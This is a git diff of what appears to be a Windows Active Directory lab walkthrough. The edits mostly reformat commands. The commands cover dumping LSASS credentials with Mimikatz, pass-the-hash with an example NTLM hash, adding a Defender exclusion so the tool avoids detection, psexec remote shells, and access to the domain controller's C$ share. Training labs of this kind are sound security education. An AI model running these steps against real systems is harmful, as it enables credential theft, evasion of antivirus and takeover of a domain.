@@ -806,10 +806,10 @@ You can also exclude folders using PowerShell. Here’s how:
 
 2. **Add a Folder Exclusion:**
 
-   - Type this command, replacing `"C:\Path\To\Your\Folder"` with the folder you want to exclude:
+   - Type this command, replacing `"C:\temp"` with the folder you want to exclude:
 
      ```powershell
-     Add-MpPreference -ExclusionPath "C:\Path\To\Your\Folder"
+     Add-MpPreference -ExclusionPath "C:\temp"
      ```
 
 3. **Check Exclusions:**
@@ -964,9 +964,11 @@ First, we need to dump the NTLM hash of the Administrator account on `win10clien
 2. Navigate to the directory containing `mimikatz.exe`.
 3. Run Mimikatz:
 
-   ```text
-       C:\temp\mimikatz\X64> .\mimikatz.exe
+   ```bash
+   .\mimikatz\x64\mimikatz.exe
+   ```
 
+   ```text
         .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
@@ -980,13 +982,13 @@ First, we need to dump the NTLM hash of the Administrator account on `win10clien
 4. In the Mimikatz console, enable debug privileges:
 
    ```bash
-       privilege::debug
+   privilege::debug
    ```
 
 5. Dump the credentials from LSASS:
 
    ```bash
-       sekurlsa::logonpasswords
+   sekurlsa::logonpasswords
    ```
 
 **Explanation:**
@@ -1019,6 +1021,12 @@ In the Mimikatz console:
 sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:<NTLM_HASH> /run:cmd.exe
 ```
 
+Example:
+
+```bash
+sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a /run:cmd.exe
+```
+
 **Replace `<NTLM_HASH>` with the actual hash extracted earlier.**
 
 **Explanation:**
@@ -1039,7 +1047,7 @@ With the new Administrator session, attempt to access `win10adm` remotely.
 **Verification: Using SMB to List Remote Shares:**
 
 ```bash
-    dir \\192.168.56.30\C$
+dir \\192.168.56.30\C$
 ```
 
 **Explanation:**
@@ -1052,7 +1060,7 @@ With the new Administrator session, attempt to access `win10adm` remotely.
 **Command:**
 
 ```bash
-psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
+C:\temp\Sysinternals\psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
 ```
 
 **Explanation:**
@@ -1082,7 +1090,7 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10adm Window):**
 
    ```bash
-     mkdir C:\temp
+   mkdir C:\temp
    ```
 
    **Explanation:**
@@ -1096,7 +1104,7 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10adm Window):**
 
    ```bash
-    powershell -c "Add-MpPreference -ExclusionPath 'C:\temp'"
+   powershell -c "Add-MpPreference -ExclusionPath 'C:\temp'"
    ```
 
    **Explanation:**
@@ -1111,7 +1119,7 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10client Window):**
 
    ```bash
-     net use x: \\192.168.56.30\C$
+   net use x: \\192.168.56.30\C$
    ```
 
    **Explanation:**
@@ -1126,8 +1134,11 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10client Window):**
 
    ```bash
-     X:
-     cd X:\temp
+   X:
+   ```
+
+   ```bash
+   cd X:\temp
    ```
 
    **Explanation:**
@@ -1142,7 +1153,7 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10client Window):**
 
    ```bash
-     copy C:\path\to\mimikatz\x64\* X:\temp\
+   copy C:\temp\mimikatz\x64\* X:\temp\
    ```
 
    **Explanation:**
@@ -1156,7 +1167,7 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    **Command (win10adm Window):**
 
    ```bash
-     C:\temp\mimikatz.exe
+   C:\temp\mimikatz.exe
    ```
 
    **Explanation:**
@@ -1177,8 +1188,6 @@ We need to dump the NTLM hash of the **Domain** Administrator account on `win10a
 1. Run Mimikatz:
 
    ```text
-       C:\temp\mimikatz\X64> .\mimikatz.exe
-
         .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
@@ -1192,13 +1201,13 @@ We need to dump the NTLM hash of the **Domain** Administrator account on `win10a
 2. In the Mimikatz console, enable debug privileges:
 
    ```bash
-       privilege::debug
+   privilege::debug
    ```
 
 3. Dump the credentials from LSASS:
 
    ```bash
-       sekurlsa::logonpasswords
+   sekurlsa::logonpasswords
    ```
 
 **Explanation:**
@@ -1244,7 +1253,7 @@ Now that we have the NTLM hash of the **Domain Admin** account (`domad`), we can
 2. **List the contents of the Domain Controller’s C$ share**:
 
    ```bash
-      dir \\192.168.56.10\c$
+   dir \\192.168.56.10\c$
    ```
 
    **Explanation**:
@@ -1262,7 +1271,13 @@ Now that you have administrative access to the Domain Controller, run **Mimikatz
    Navigate to the location of **Mimikatz**:
 
    ```bash
-      C:\temp\mimikatz.exe
+   cd C:\temp\
+   ```
+
+   Run **Mimikatz**
+
+   ```bash
+   .\mimikatz\x64\mimikatz.exe
    ```
 
 2. **Enable Privilege Debugging**:
